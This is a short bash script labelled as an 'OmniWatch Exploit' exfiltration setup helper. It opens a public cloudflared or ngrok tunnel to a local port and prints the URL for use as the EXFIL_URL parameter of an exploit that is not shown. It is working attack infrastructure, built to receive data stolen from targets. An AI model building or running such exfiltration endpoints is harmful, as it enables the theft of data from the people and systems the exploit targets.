#!/bin/bash
# OmniWatch Exploit - Exfiltration Setup Helper
# This script sets up the exfiltration endpoint

echo "╔════════════════════════════════════════════════╗"
echo "║  OmniWatch - Exfiltration Endpoint Setup      ║"
echo "╚════════════════════════════════════════════════╝"
echo ""

# Check for cloudflared
if command -v cloudflared &> /dev/null; then
    echo "[+] cloudflared found"
    echo "[*] Starting cloudflared tunnel on port 9090..."
    echo ""
    cloudflared tunnel --url http://localhost:9090 2>&1 | grep --line-buffered "trycloudflare.com" | head -1 | sed 's/.*|\s*/[+] Your exfil URL: /'
    echo ""
    echo "[!] Keep this terminal open while exploit runs"
    echo "[*] Use the URL above as the EXFIL_URL parameter"
    echo ""
    cloudflared tunnel --url http://localhost:9090
elif command -v ngrok &> /dev/null; then
    echo "[+] ngrok found"
    echo "[!] WARNING: ngrok free tier may have interstitial page issues"
    echo "[*] Starting ngrok tunnel on port 9090..."
    echo ""
    ngrok http 9090
else
    echo "[-] Neither cloudflared nor ngrok found"
    echo ""
    echo "Install cloudflared (recommended):"
    echo "  wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    echo "  chmod +x cloudflared-linux-amd64"
    echo "  sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared"
    echo ""
    echo "Or install ngrok:"
    echo "  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
    echo "  tar xvzf ngrok-v3-stable-linux-amd64.tgz"
    echo "  sudo mv ngrok /usr/local/bin/"
    exit 1
fi
